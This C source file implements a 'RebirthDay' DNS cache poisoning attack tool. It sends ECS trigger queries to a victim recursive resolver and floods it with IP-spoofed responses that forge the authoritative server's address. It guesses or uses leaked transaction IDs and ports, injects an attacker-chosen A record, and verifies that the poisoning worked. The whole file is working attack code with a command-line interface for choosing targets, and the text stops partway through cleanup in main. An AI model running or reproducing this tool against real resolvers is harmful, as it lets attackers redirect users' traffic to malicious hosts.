/*
    RebirthDay Attack using Multi-Sender Framework with sendmmsg

    This implementation uses the sender framework with:
    - Multi-sender instances for parallel sending
    - sendmmsg batch sending for high performance
    - Dedicated verification thread

    Architecture:
    1. Main thread: Coordinates attack rounds
    2. Trigger sender: Sends ECS queries using sender framework
    3. Flood sender: Sends spoofed responses using multi-sender + sendmmsg
    4. Verification thread: Validates cache poisoning success
*/

#include "sender.h"
#include "strategy.h"
#include "dns.h"
#include "parser.h"
#include "network.h"
#include "arena.h"
#include <signal.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

// --- Attack Configuration ---
#define TOTAL_ROUNDS        500
#define TRIGGER_COUNT       10000
#define FLOOD_PACKET_COUNT  65535 * 10000
#define ATTACK_DURATION_MS  6000
#define VERIFY_TIMEOUT_SEC  2
#define ECS_FAMILY_IPV4     1
#define SIDE_CHANNEL_PORT   9999

// Multi-sender config
#define NUM_FLOOD_SENDERS   4
#define SENDMMSG_BATCH_SIZE 64

// --- Side Channel Data ---
typedef struct {
    uint16_t txid;
    uint16_t port;
    volatile bool received;
    pthread_mutex_t lock;
} leaked_info_t;

// --- ECS Make Args (FIXED: Use fixed-size arrays) ---
typedef struct {
    char victim_ip[16];
    char qname[256];
    int count;
    uint32_t base_subnet;
} ecs_make_args_t;

// --- Flood Make Args (FIXED: Use fixed-size array to avoid data race) ---
typedef struct {
    char auth_ip[16];
    char victim_ip[16];
    char qname[256];
    char poison_ip[16];
    int count;
    leaked_info_t* leaked_info;
    bool use_txid;
    bool use_port;
} flood_make_args_t;

// --- Verification Result ---
typedef struct {
    bool success;
    bool completed;
    char result_ip[INET_ADDRSTRLEN];
    pthread_mutex_t lock;
} verify_result_t;

// --- Attack Round Context ---
typedef struct {
    char qname[256];
    char* victim_ip;
    char* auth_ip;
    char* domain;
    char* poison_ip;
    leaked_info_t* leaked_info;
    volatile bool* should_stop;
    int round;
    bool use_txid;
    bool use_port;

    // Pre-initialized senders (reused across rounds)
    sender_t* trigger_sender;
    multi_sender_t* flood_ms;

    // Make args (updated per round)
    ecs_make_args_t ecs_args_storage;
    flood_make_args_t flood_args_storage;

    // Strategies (reused, only args updated per round)
    sender_strategy_t* trigger_strategy;
    sender_strategy_t** flood_strategies;  // Array of strategies

    // Verification context (persistent)
    struct {
        char qname[256];
        char* victim_ip;
        char* auth_ip;
        char* poison_ip;
        leaked_info_t* leaked_info;
        int round;
    } verify_ctx_storage;
} attack_context_t;

// Verification context (simpler version for verify thread)
typedef struct {
    char qname[256];
    char* victim_ip;
    char* auth_ip;
    char* poison_ip;
    leaked_info_t* leaked_info;
    int round;
} verify_ctx_t;

// --- Global state ---
static volatile bool g_running = true;
static int g_success_count = 0;
static pthread_mutex_t g_stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// --- Function Declarations ---
static void* verification_thread_func(void* arg);
static void trigger_work_cb(uv_work_t* req);
static void trigger_after_work_cb(uv_work_t* req, int status);
static bool make_trigger_packets(Arena* arena, packet_queue_t* queue, void* args);
static bool make_flood_packets(Arena* arena, packet_queue_t* queue, void* args);
static void flush_socket_buffer(int sockfd);
static bool receive_leaked_info(int listen_sockfd, leaked_info_t* info, int timeout_sec);
static int create_side_channel_socket(void);

/*
    Dedicated libuv event loop thread
    Runs uv_run() in a separate thread to avoid blocking main thread
*/
static void* libuv_runner_thread(void* arg) {
    uv_loop_t* loop = (uv_loop_t*)arg;
    printf("[+] Dedicated libuv event loop thread started.\n");
    uv_run(loop, UV_RUN_DEFAULT);
    printf("[+] Libuv event loop thread exiting.\n");
    return NULL;
}

/*
    Async stop callback - called in libuv thread context
*/
static void async_stop_cb(uv_async_t* handle) {
    printf("[+] Received async stop request, stopping libuv loop...\n");
    uv_loop_t* loop = handle->loop;
    uv_stop(loop);
    uv_close((uv_handle_t*)handle, NULL);
}

/*
    Signal handler for graceful shutdown
*/
static void on_signal(uv_signal_t* handle, int signum) {
    (void)handle;
    printf("\n[Signal] Caught %d, stopping attack...\n", signum);
    g_running = false;
}

/*
    Build DNS packet with ECS option
*/
static size_t make_dns_packet_with_ecs(
    uint8_t* buff, size_t buff_len,
    uint16_t tx_id, const char* qname,
    uint32_t ecs_ip_net_order
) {
    struct dnshdr* dnsh = (struct dnshdr*)buff;
    memset(dnsh, 0, sizeof(struct dnshdr));
    dnsh->id = htons(tx_id);
    dnsh->flags = htons(0x0100);  // Standard query with RD
    dnsh->qdcount = htons(1);
    dnsh->arcount = htons(1);     // EDNS0 option

    uint8_t* ptr = buff + sizeof(struct dnshdr);
    size_t qname_encoded_len = dns_encode(ptr, buff_len - (ptr - buff), (char*)qname);
    if (qname_encoded_len <= 0) return 0;
    ptr += qname_encoded_len;

    // Question section
    *(uint16_t*)ptr = htons(RR_TYPE_A); ptr += 2;
    *(uint16_t*)ptr = htons(RR_CLASS_IN); ptr += 2;

    // EDNS0 OPT record
    *ptr++ = 0;  // Empty label for OPT
    *(uint16_t*)ptr = htons(41); ptr += 2;  // TYPE = OPT
    *(uint16_t*)ptr = htons(4096); ptr += 2; // UDP size
    *(uint32_t*)ptr = htonl(0); ptr += 4;   // Extended RCODE = 0

    // ECS option data
    uint16_t* rdlen_ptr = (uint16_t*)ptr; ptr += 2;
    uint8_t* rdata_start = ptr;

    *(uint16_t*)ptr = htons(8); ptr += 2;  // OPTION-CODE: ECS
    *(uint16_t*)ptr = htons(8); ptr += 2;  // OPTION-LENGTH: 8
    *(uint16_t*)ptr = htons(ECS_FAMILY_IPV4); ptr += 2;  // FAMILY: IPv4
    *ptr++ = 32;  // SOURCE PREFIX-LENGTH
    *ptr++ = 0;   // SCOPE PREFIX-LENGTH
    memcpy(ptr, &ecs_ip_net_order, 4); ptr += 4;

    *rdlen_ptr = htons(ptr - rdata_start);
    return ptr - buff;
}

/*
    Make trigger packets with ECS options
*/
static bool make_trigger_packets(Arena* arena, packet_queue_t* queue, void* args) {
    ecs_make_args_t* ecs_args = (ecs_make_args_t*)args;
    if (!arena || !queue || !ecs_args) return false;

    printf("[TRIGGER] Building %d ECS query packets for %s\n", ecs_args->count, ecs_args->qname);

    for (int i = 0; i < ecs_args->count; i++) {
        uint8_t* pkt_buf = (uint8_t*)arena_alloc_memory(arena, 512);
        uint32_t fake_subnet = htonl((11 << 24) | (i << 16));
        size_t pkt_len = make_dns_packet_with_ecs(pkt_buf, 512, get_tx_id(), ecs_args->qname, fake_subnet);

        if (pkt_len > 0) {
            packet_t* pkt = (packet_t*)arena_alloc(arena, sizeof(packet_t));
            pkt->data = (uint8_t*)arena_alloc(arena, pkt_len);
            memcpy(pkt->data, pkt_buf, pkt_len);
            pkt->size = pkt_len;
            pkt->next = NULL;
            memset(&pkt->dest_addr, 0, sizeof(pkt->dest_addr));

            // Set destination
            pkt->dest_addr.sin_family = AF_INET;
            pkt->dest_addr.sin_port = htons(53);
            pkt->dest_addr.sin_addr.s_addr = inet_addr(ecs_args->victim_ip);

            if (queue->head == NULL) {
                queue->head = pkt;
                queue->tail = pkt;
            } else {
                queue->tail->next = pkt;
                queue->tail = pkt;
            }
        }
    }
    return true;
}

/*
    Make flood packets (spoofed DNS responses)
    Uses leaked txid and port if available

    OPTIMIZED FOR MULTITASK MODE:
    - No blocking wait (main thread controls flow)
    - No arena_rewind bug (template preserved)
    - Supports blind mode (-u 0) with random txid/port
    - Generates small chunks for memory efficiency
*/
static bool make_flood_packets(Arena* arena, packet_queue_t* queue, void* args) {
    flood_make_args_t* flood_args = (flood_make_args_t*)args;
    if (!arena || !queue || !flood_args) return false;

    // [OPTIMIZATION 1] No blocking wait here - main thread ensures received==true
    // before submitting work to multitask queue
    if (!flood_args->leaked_info->received) {
        // Should not happen if main thread logic is correct
        return false;
    }

    uint16_t precise_txid = flood_args->leaked_info->txid;
    uint16_t precise_port = flood_args->leaked_info->port;

    // [OPTIMIZATION 2] Create template packet (do NOT rewind after!)
    struct dns_query* query[] = { new_dns_query_a(arena, flood_args->qname) };
    struct dns_answer* answer[] = {
        new_dns_answer_a(arena, flood_args->qname, inet_addr(flood_args->poison_ip), 300)
    };

    uint8_t* dns_payload = (uint8_t*)arena_alloc_memory(arena, DNS_PKT_MAX_LEN);
    size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0,
                                              query, 1, answer, 1, NULL, 0, NULL, 0, FALSE);

    uint8_t* pkt_template = (uint8_t*)arena_alloc_memory(arena, DNS_PKT_MAX_LEN);
    size_t pkt_raw_len = make_udp_packet(pkt_template, DNS_PKT_MAX_LEN,
                                          inet_addr(flood_args->auth_ip),
                                          inet_addr(flood_args->victim_ip),
                                          53, 0, dns_payload, dns_payload_len);

    // [OPTIMIZATION 3] REMOVED arena_rewind - template must be preserved!
    // The template is allocated in the arena and will be freed when the batch completes.
    // We just copy from it, not modify it.

    // [OPTIMIZATION 4] Generate chunk-sized batches for memory efficiency
    // In multitask mode, this function is called repeatedly, generating small batches
    int packets_to_make;

    if (flood_args->use_txid && flood_args->use_port) {
        // Precise mode: only need a few packets with exact txid/port
        packets_to_make = 10;
    } else {
        // Blind mode or partial mode: generate massive random packets
        // 16384 packets per chunk, 4 senders = 65536 packets per round (covers 16-bit space)
        packets_to_make = 16384;
    }

    for (int i = 0; i < packets_to_make; i++) {
        // Allocate fresh buffer for each packet
        uint8_t* pkt_data = (uint8_t*)arena_alloc_memory(arena, pkt_raw_len);
        memcpy(pkt_data, pkt_template, pkt_raw_len);

        struct udphdr* udph = (struct udphdr*)(pkt_data + sizeof(struct iphdr));
        struct dnshdr* dnsh = (struct dnshdr*)(pkt_data + sizeof(struct iphdr) + sizeof(struct udphdr));

        // [OPTIMIZATION 5] Support blind mode with random values
        dnsh->id = htons(flood_args->use_txid ? precise_txid : (random() % 65536));
        uint16_t target_port = flood_args->use_port ? precise_port : (random() % 65536);
        udph->dest = htons(target_port);
        udph->len = htons(sizeof(struct udphdr) + dns_payload_len);

        // Calculate UDP checksum
        udph->check = 0;
        struct iphdr* iph = (struct iphdr*)pkt_data;
        uint32_t sum = 0;
        uint32_t ip_src = iph->saddr;
        uint32_t ip_dst = iph->daddr;

        // Pseudo-header
        sum += (ip_src >> 16) & 0xFFFF;
        sum += ip_src & 0xFFFF;
        sum += (ip_dst >> 16) & 0xFFFF;
        sum += ip_dst & 0xFFFF;
        sum += htons(iph->protocol);
        sum += htons(sizeof(struct udphdr) + dns_payload_len);

        // UDP header + payload
        uint16_t* buf = (uint16_t*)udph;
        int len = sizeof(struct udphdr) + dns_payload_len;
        while (len > 1) {
            sum += *buf++;
            len -= 2;
        }
        if (len == 1) {
            sum += *(uint8_t*)buf;
        }

        // Fold and complement
        while (sum >> 16) {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        udph->check = (uint16_t)(~sum);

        packet_t* pkt = (packet_t*)arena_alloc(arena, sizeof(packet_t));
        pkt->data = pkt_data;
        pkt->size = pkt_raw_len;
        pkt->next = NULL;
        memset(&pkt->dest_addr, 0, sizeof(pkt->dest_addr));

        pkt->dest_addr.sin_family = AF_INET;
        pkt->dest_addr.sin_port = htons(target_port);
        pkt->dest_addr.sin_addr.s_addr = inet_addr(flood_args->victim_ip);

        if (queue->head == NULL) {
            queue->head = pkt;
            queue->tail = pkt;
        } else {
            queue->tail->next = pkt;
            queue->tail = pkt;
        }
    }

    return true;  // Return true to trigger next batch in multitask mode
}

/*
    Trigger work callback (runs in worker thread)
*/
static void trigger_work_cb(uv_work_t* req) {
    packet_work_t* work = (packet_work_t*)req;
    sender_t* sender = work->sender_handle;

    work->batch = (packet_batch_t*)alloc_memory(sizeof(packet_batch_t));
    if (!work->batch) {
        work->error_code = INIT_ERROR;
        return;
    }

    memset(&work->batch->arena, 0, sizeof(Arena));
    work->batch->packets.head = NULL;
    work->batch->packets.tail = NULL;

    default_strategy_data_t* s_data = (default_strategy_data_t*)sender->strategy->data;
    if (!s_data->make_func || !s_data->packet_args) {
        work->error_code = BROKEN_ERROR;
        return;
    }

    if (!s_data->make_func(&work->batch->arena, &work->batch->packets, s_data->packet_args)) {
        work->error_code = MAKE_ERROR;
        arena_free(&work->batch->arena);
        free(work->batch);
        work->batch = NULL;
        return;
    }

    work->error_code = NOERROR;
}

/*
    Trigger after work callback
*/
static void trigger_after_work_cb(uv_work_t* req, int status) {
    packet_work_t* work = (packet_work_t*)req;

    if (status == UV_ECANCELED) {
        if (work->batch) {
            arena_free(&work->batch->arena);
            free(work->batch);
        }
        free(work);
        return;
    }

    if (work->error_code != NOERROR) {
        fprintf(stderr, "[TRIGGER] Work failed with error code: %d\n", work->error_code);
        free(work);
        return;
    }

    if (work->batch && work->batch->packets.head) {
        sender_add_batch_to_queue(work->sender_handle, work->batch);
    } else if (work->batch) {
        arena_free(&work->batch->arena);
        free(work->batch);
    }

    free(work);
}

/*
    Flush socket buffer to remove stale packets
*/
static void flush_socket_buffer(int sockfd) {
    int old_flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, old_flags | O_NONBLOCK);

    uint8_t trash[1024];
    int flushed_count = 0;

    while (recvfrom(sockfd, trash, sizeof(trash), 0, NULL, NULL) > 0) {
        flushed_count++;
    }

    fcntl(sockfd, F_SETFL, old_flags);

    if (flushed_count > 0) {
        printf("[FLUSH] Cleared %d old packet(s) from socket buffer\n", flushed_count);
    }
}

/*
    Receive leaked txid and port from side channel
*/
static bool receive_leaked_info(int listen_sockfd, leaked_info_t* info, int timeout_sec) {
    flush_socket_buffer(listen_sockfd);

    fd_set readfds;
    struct timeval tv;

    FD_ZERO(&readfds);
    FD_SET(listen_sockfd, &readfds);

    tv.tv_sec = timeout_sec;
    tv.tv_usec = 0;

    int ret = select(listen_sockfd + 1, &readfds, NULL, NULL, &tv);

    if (ret > 0) {
        uint8_t buffer[4];
        struct sockaddr_in from_addr;
        socklen_t from_len = sizeof(from_addr);

        ssize_t n = recvfrom(listen_sockfd, buffer, sizeof(buffer), 0,
                            (struct sockaddr*)&from_addr, &from_len);

        if (n == 4) {
            pthread_mutex_lock(&info->lock);
            info->txid = ntohs(*(uint16_t*)&buffer[0]);
            info->port = ntohs(*(uint16_t*)&buffer[2]);
            info->received = true;
            pthread_mutex_unlock(&info->lock);

            printf("[LEAK] Received: TxID=%u, Port=%u from %s\n",
                   info->txid, info->port, inet_ntoa(from_addr.sin_addr));
            return true;
        }
    }

    printf("[LEAK] Timeout waiting for leaked info\n");
    return false;
}

/*
    Create side channel listener socket
*/
static int create_side_channel_socket(void) {
    int listen_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (listen_sockfd < 0) {
        perror("Failed to create listening socket");
        return -1;
    }

    // Allow address reuse
    int opt = 1;
    setsockopt(listen_sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in listen_addr;
    memset(&listen_addr, 0, sizeof(listen_addr));
    listen_addr.sin_family = AF_INET;
    listen_addr.sin_addr.s_addr = INADDR_ANY;
    listen_addr.sin_port = htons(SIDE_CHANNEL_PORT);

    if (bind(listen_sockfd, (struct sockaddr*)&listen_addr, sizeof(listen_addr)) < 0) {
        perror("Failed to bind listening socket");
        close(listen_sockfd);
        return -1;
    }

    printf("[+] Side channel listening on port %d\n", SIDE_CHANNEL_PORT);
    return listen_sockfd;
}

/*
    Verification thread function
    Sends a DNS query to check if cache was poisoned
*/
static void* verification_thread_func(void* arg) {
    verify_ctx_t* ctx = (verify_ctx_t*)arg;
    Arena arena = {0};

    int sockfd = make_sockfd_for_dns(VERIFY_TIMEOUT_SEC);
    if (sockfd < 0) {
        return NULL;
    }

    printf("[VERIFY] Sending verification query for %s\n", ctx->qname);

    struct dns_query* query[] = { new_dns_query_a(&arena, ctx->qname) };
    send_dns_req(&arena, sockfd, ctx->victim_ip, 53, query, 1);

    uint8_t buffer[1024];
    ssize_t n = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
    close(sockfd);

    bool success = false;
    char result_ip[INET_ADDRSTRLEN] = {0};

    if (n > 0) {
        parsed_dns_packet_t dns_packet;
        memset(&dns_packet, 0, sizeof(dns_packet));

        if (unpack_dns_packet(&arena, buffer, n, &dns_packet)) {
            for (dns_parsed_rr_t* rr = dns_packet.answers; rr; rr = rr->next) {
                if (rr->rtype == RR_TYPE_A && rr->rdlength == 4) {
                    inet_ntop(AF_INET, rr->rdata, result_ip, INET_ADDRSTRLEN);
                    printf("[VERIFY] Received A record: %s -> %s\n", rr->name, result_ip);

                    if (strcmp(result_ip, ctx->poison_ip) == 0) {
                        success = true;
                    }
                }
            }
        }
    } else {
        printf("[VERIFY] No response received\n");
    }

    // Update global stats
    pthread_mutex_lock(&g_stats_mutex);
    if (success) {
        g_success_count++;
        printf("[SUCCESS] Round %d: Cache poisoned with %s!\n", ctx->round, result_ip);
    } else {
        printf("[FAILED] Round %d: Cache not poisoned\n", ctx->round);
    }
    pthread_mutex_unlock(&g_stats_mutex);

    arena_free(&arena);
    return NULL;
}

/*
    Run single attack round (using pre-initialized senders)

    OPTIMIZED:
    - Blind mode support (-u 0)
    - Multitask continuous packet generation
    - Proper flow control
*/
static void run_attack_round(attack_context_t* ctx, verify_ctx_t* verify_ctx, int side_channel_sockfd) {
    int round = ctx->round;

    // Generate unique domain for this round
    snprintf(ctx->qname, sizeof(ctx->qname), "rb-%d-%ld.%s", round, time(NULL), ctx->domain);

    printf("\n=== Round %d: %s ===\n", round, ctx->qname);

    // Initialize leaked info (per-round)
    leaked_info_t leaked = {0, 0, false};
    pthread_mutex_init(&leaked.lock, NULL);
    ctx->leaked_info = &leaked;

    // Update per-round args (qname and leaked_info pointer)
    // FIXED: Use strncpy for deep copy to avoid data race
    strncpy(ctx->ecs_args_storage.qname, ctx->qname, sizeof(ctx->ecs_args_storage.qname) - 1);
    ctx->ecs_args_storage.qname[sizeof(ctx->ecs_args_storage.qname) - 1] = '\0';
    ctx->ecs_args_storage.count = TRIGGER_COUNT;
    strncpy(ctx->ecs_args_storage.victim_ip, ctx->victim_ip, sizeof(ctx->ecs_args_storage.victim_ip) - 1);
    ctx->ecs_args_storage.victim_ip[sizeof(ctx->ecs_args_storage.victim_ip) - 1] = '\0';

    strncpy(ctx->flood_args_storage.qname, ctx->qname, sizeof(ctx->flood_args_storage.qname) - 1);
    ctx->flood_args_storage.qname[sizeof(ctx->flood_args_storage.qname) - 1] = '\0';
    ctx->flood_args_storage.count = FLOOD_PACKET_COUNT / NUM_FLOOD_SENDERS;
    ctx->flood_args_storage.leaked_info = &leaked;

    // ===== Attack Phase =====

    // Step 1: Send trigger queries
    // NOTE: Sender is started globally in main(), just submit work here
    printf("[*] Step 1: Sending %d ECS trigger queries...\n", TRIGGER_COUNT);

    // [FIX] Submit trigger work to multitask sender
    multitask_submit_work(
        ctx->trigger_sender,
        make_trigger_packets,
        &ctx->ecs_args_storage,
        NULL
    );

    // Wait for trigger packets to be sent and processed by auth server
    usleep(100000);  // 100ms

    // Step 2: Wait for side channel info (with blind mode support)
    printf("[*] Step 2: Waiting for leaked txid/port...\n");

    // [OPTIMIZATION: Blind Mode Support]
    if (ctx->use_txid || ctx->use_port) {
        // Need specific info, wait for side channel
        if (!receive_leaked_info(side_channel_sockfd, &leaked, VERIFY_TIMEOUT_SEC)) {
            printf("[!] No leaked info received, skipping flood\n");
            // NOTE: Don't stop sender here, it's managed globally
            pthread_mutex_destroy(&leaked.lock);
            return;
        }
    } else {
        // Blind mode (-u 0): bypass side channel wait
        printf("[*] Blind mode enabled (-u 0), bypassing side channel wait.\n");
        leaked.received = true;  // Force to true to allow flood to proceed
        leaked.txid = random() % 65536;   // Random txid (won't be used with use_txid=false)
        leaked.port = random() % 65536;   // Random port (won't be used with use_port=false)
    }

    usleep(400000);  // Extra wait for auth server to process triggers and send side channel leak

    // Step 3: Flood senders (already started globally in main())
    if (leaked.received) {
        printf("[*] Step 3: Pumping flood packets (%d instances, multitask mode)...\n", NUM_FLOOD_SENDERS);

        // [FIX] NO need to start here - already running globally

        // [OPTIMIZATION: Multitask Mode + Active Pump]
        // Submit initial work items to each flood sender
        // Each sender will continuously generate and send packets
        for (int i = 0; i < NUM_FLOOD_SENDERS; i++) {
            // Submit multiple work items to prime the pump
            for (int j = 0; j < 5; j++) {
                multitask_submit_work(
                    &ctx->flood_ms->senders[i],
                    make_flood_packets,
                    &ctx->flood_args_storage,
                    NULL  // No cleanup needed for stack-allocated args
                );
            }
        }

        // [OPTIMIZATION: Active Pumping - continuously replenish work queue]
        // Instead of sleeping for the entire duration, we wake up periodically
        // to submit new work items, ensuring senders never run out of "ammo"
        printf("[*] Flooding for %dms (Active pumping)...\n", ATTACK_DURATION_MS);

        int elapsed_ms = 0;
        int interval_ms = 100;  // Replenish every 100ms

        while (elapsed_ms < ATTACK_DURATION_MS && g_running) {
            // Replenish work queue for each sender
            // This ensures continuous packet generation without memory explosion
            for (int i = 0; i < NUM_FLOOD_SENDERS; i++) {
                multitask_submit_work(
                    &ctx->flood_ms->senders[i],
                    make_flood_packets,
                    &ctx->flood_args_storage,
                    NULL
                );
            }

            usleep(interval_ms * 1000);
            elapsed_ms += interval_ms;
        }

        // [FIX] NO need to stop here - will drain queue and let it finish naturally
        printf("[*] Flood pumping done. Waiting for queue to drain...\n");
        usleep(500000);  // Wait 500ms for residual packets to be sent
    } else {
        printf("[!] Skipping flood - no leaked info received\n");
    }

    // NOTE: Don't stop trigger sender here - it's managed globally
    // Step 4: Verification (in separate thread)
    printf("[*] Step 4: Running verification...\n");
    strncpy(verify_ctx->qname, ctx->qname, sizeof(verify_ctx->qname) - 1);
    verify_ctx->round = round;
    verify_ctx->leaked_info = &leaked;

    pthread_t verify_tid;
    pthread_create(&verify_tid, NULL, verification_thread_func, verify_ctx);
    pthread_join(verify_tid, NULL);

    // Cleanup per-round resources
    pthread_mutex_destroy(&leaked.lock);

    // Wait for cache to potentially expire
    sleep(1);
}

/*
    Print usage
*/
static void print_usage(const char* prog) {
    fprintf(stderr, "Usage: %s -t <VictimIP> -a <AuthIP> -d <Domain> [options]\n", prog);
    fprintf(stderr, "  -t: IP address of victim recursive resolver\n");
    fprintf(stderr, "  -a: IP address of authoritative server (to spoof)\n");
    fprintf(stderr, "  -d: Base domain to target (e.g., example.com)\n");
    fprintf(stderr, "  -p: Malicious IP to inject (default: 6.6.6.6)\n");
    fprintf(stderr, "  -r: Number of attack rounds (default: 500)\n");
    fprintf(stderr, "  -u: Use leaked info: 1=TxID, 2=Port, 3=Both (default: 0)\n");
}

int main(int argc, char** argv) {
    char* victim_ip = NULL;
    char* auth_ip = NULL;
    char* domain = NULL;
    char* poison_ip = "6.6.6.6";
    int rounds = TOTAL_ROUNDS;
    int use_slt = 0;

    int ch;
    while ((ch = getopt(argc, argv, "t:a:d:p:r:u:")) != -1) {
        switch(ch) {
            case 't': victim_ip = optarg; break;
            case 'a': auth_ip = optarg; break;
            case 'd': domain = optarg; break;
            case 'p': poison_ip = optarg; break;
            case 'r': rounds = atoi(optarg); break;
            case 'u': use_slt = atoi(optarg); break;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    if (!victim_ip || !auth_ip || !domain) {
        print_usage(argv[0]);
        return 1;
    }

    bool use_txid = (use_slt == 1 || use_slt == 3);
    bool use_port = (use_slt == 2 || use_slt == 3);

    dns_init();
    srand(time(NULL));

    printf("=== RebirthDay Attack (Multi-Sender + sendmmsg) ===\n");
    printf("    Target Resolver: %s\n", victim_ip);
    printf("    Spoofed Auth IP: %s\n", auth_ip);
    printf("    Target Domain  : %s\n", domain);
    printf("    Poison IP      : %s\n", poison_ip);
    printf("    Rounds         : %d\n", rounds);
    printf("    Use TxID       : %s\n", use_txid ? "Yes" : "No");
    printf("    Use Port       : %s\n", use_port ? "Yes" : "No");
    printf("    Flood Senders  : %d\n", NUM_FLOOD_SENDERS);
    printf("    Batch Size     : %d (sendmmsg)\n", SENDMMSG_BATCH_SIZE);
    printf("=============================================\n\n");

    // Create side channel socket
    int side_channel_sockfd = create_side_channel_socket();
    if (side_channel_sockfd < 0) {
        return 1;
    }

    // Initialize libuv loop
    uv_loop_t* loop = uv_default_loop();

    // Setup signal handler
    uv_signal_t signal_handle;
    uv_signal_init(loop, &signal_handle);
    signal_handle.data = NULL;
    uv_signal_start(&signal_handle, on_signal, SIGINT);

    // ========== Pre-initialize senders (reused across all rounds) ==========

    // Create attack context
    attack_context_t ctx;
    memset(&ctx, 0, sizeof(attack_context_t));
    ctx.victim_ip = victim_ip;
    ctx.auth_ip = auth_ip;
    ctx.domain = domain;
    ctx.poison_ip = poison_ip;
    ctx.use_txid = use_txid;
    ctx.use_port = use_port;
    ctx.should_stop = &g_running;

    // Create verify context
    verify_ctx_t verify_ctx;
    memset(&verify_ctx, 0, sizeof(verify_ctx_t));
    verify_ctx.victim_ip = victim_ip;
    verify_ctx.auth_ip = auth_ip;
    verify_ctx.poison_ip = poison_ip;

    // Initialize trigger sender (single sender for ECS queries)
    ctx.trigger_sender = (sender_t*)alloc_memory(sizeof(sender_t));
    if (sender_init(ctx.trigger_sender, loop, victim_ip, 53) != 0) {
        fprintf(stderr, "Failed to initialize trigger sender\n");
        close(side_channel_sockfd);
        return 1;
    }

    // Initialize multi-sender for flood (4 senders for parallel spoofed responses)
    ctx.flood_ms = (multi_sender_t*)alloc_memory(sizeof(multi_sender_t));
    multi_sender_config_t flood_config = {
        .num_senders = NUM_FLOOD_SENDERS,
        .dst_port = 53
    };
    strncpy(flood_config.dst_ip, victim_ip, sizeof(flood_config.dst_ip) - 1);
    for (int i = 0; i < NUM_FLOOD_SENDERS; i++) {
        snprintf(flood_config.src_ips[i], sizeof(flood_config.src_ips[i]), "%s", auth_ip);
        flood_config.src_ports[i] = 53 + i;
    }

    if (multi_sender_init(ctx.flood_ms, loop, &flood_config) != 0) {
        fprintf(stderr, "Failed to initialize flood multi-sender\n");
        sender_free(ctx.trigger_sender);
        close(side_channel_sockfd);
        return 1;
    }

    // Setup ECS make args (persistent, qname updated per round)
    // FIXED: Use strncpy for deep copy
    strncpy(ctx.ecs_args_storage.victim_ip, victim_ip, sizeof(ctx.ecs_args_storage.victim_ip) - 1);
    ctx.ecs_args_storage.victim_ip[sizeof(ctx.ecs_args_storage.victim_ip) - 1] = '\0';
    ctx.ecs_args_storage.qname[0] = '\0';  // Will be updated per round
    ctx.ecs_args_storage.count = TRIGGER_COUNT;
    ctx.ecs_args_storage.base_subnet = 0;

    // Create trigger strategy (reused) - [FIX] Use multitask instead of oneshot
    ctx.trigger_strategy = create_strategy_multitask(
        NULL,
        NULL,
        NULL,
        50  // Max queue size
    );
    sender_set_strategy(ctx.trigger_sender, ctx.trigger_strategy);

    // Setup flood make args (persistent, qname/leaked_info updated per round)
    // FIXED: Use strncpy for deep copy to avoid data race
    strncpy(ctx.flood_args_storage.auth_ip, auth_ip, sizeof(ctx.flood_args_storage.auth_ip) - 1);
    ctx.flood_args_storage.auth_ip[sizeof(ctx.flood_args_storage.auth_ip) - 1] = '\0';
    strncpy(ctx.flood_args_storage.victim_ip, victim_ip, sizeof(ctx.flood_args_storage.victim_ip) - 1);
    ctx.flood_args_storage.victim_ip[sizeof(ctx.flood_args_storage.victim_ip) - 1] = '\0';
    strncpy(ctx.flood_args_storage.poison_ip, poison_ip, sizeof(ctx.flood_args_storage.poison_ip) - 1);
    ctx.flood_args_storage.poison_ip[sizeof(ctx.flood_args_storage.poison_ip) - 1] = '\0';
    ctx.flood_args_storage.qname[0] = '\0';      // Will be updated per round
    ctx.flood_args_storage.count = FLOOD_PACKET_COUNT / NUM_FLOOD_SENDERS;
    ctx.flood_args_storage.leaked_info = NULL;     // Will be set per round
    ctx.flood_args_storage.use_txid = use_txid;
    ctx.flood_args_storage.use_port = use_port;

    // Allocate flood strategies array
    ctx.flood_strategies = (sender_strategy_t**)alloc_memory(sizeof(sender_strategy_t*) * NUM_FLOOD_SENDERS);

    // [OPTIMIZATION: Use multitask strategy instead of oneshot]
    // Multitask allows continuous packet generation without memory explosion
    for (int i = 0; i < NUM_FLOOD_SENDERS; i++) {
        ctx.flood_strategies[i] = create_strategy_multitask(
            NULL,  // No custom send func (uses default)
            NULL,  // No send args
            NULL,  // No free send args func
            50     // Max queue size for multitask
        );
        sender_set_strategy(&ctx.flood_ms->senders[i], ctx.flood_strategies[i]);
    }

    printf("[+] Pre-initialized trigger sender and %d flood senders (multitask mode)\n\n", NUM_FLOOD_SENDERS);

    // [FIX] Initialize uv_async BEFORE starting the libuv thread
    // uv_async_init must be called before uv_run starts, not from another thread
    uv_async_t stop_async;
    uv_async_init(loop, &stop_async, async_stop_cb);
    stop_async.data = NULL;

    // ========== [FIX] Global start - MUST start BEFORE pthread_create ==========
    // sender_start/multi_sender_start internally call uv_async_init which must
    // be called from the same thread that called uv_run (the libuv thread)
    // So we start senders first, then create the libuv runner thread
    printf("[*] Starting all senders globally...\n");
    sender_start(ctx.trigger_sender);
    multi_sender_start(ctx.flood_ms);

    // [OPTIMIZATION: Start dedicated libuv event loop thread]
    // This prevents the main thread from being blocked by uv_run()
    // Main thread can now sleep/select while libuv thread handles packet I/O
    pthread_t uv_tid;
    pthread_create(&uv_tid, NULL, libuv_runner_thread, loop);

    // ========== Run attack rounds ==========
    for (int round = 1; round <= rounds && g_running; round++) {
        ctx.round = round;
        run_attack_round(&ctx, &verify_ctx, side_channel_sockfd);
    }

    // ========== Cleanup ==========
    g_running = false;

    // [FIX] Stop all senders globally before shutting down libuv
    printf("[*] Stopping all senders...\n");
    multi_sender_stop(ctx.flood_ms);
    sender_stop(ctx.trigger_sender);
    usleep(100000);  // Give 100ms for stop to propagate

    // [FIX] stop_async already initialized before thread started, just send it
    printf("[*] Sending async stop request to libuv thread...\n");
    uv_async_send(&stop_async);

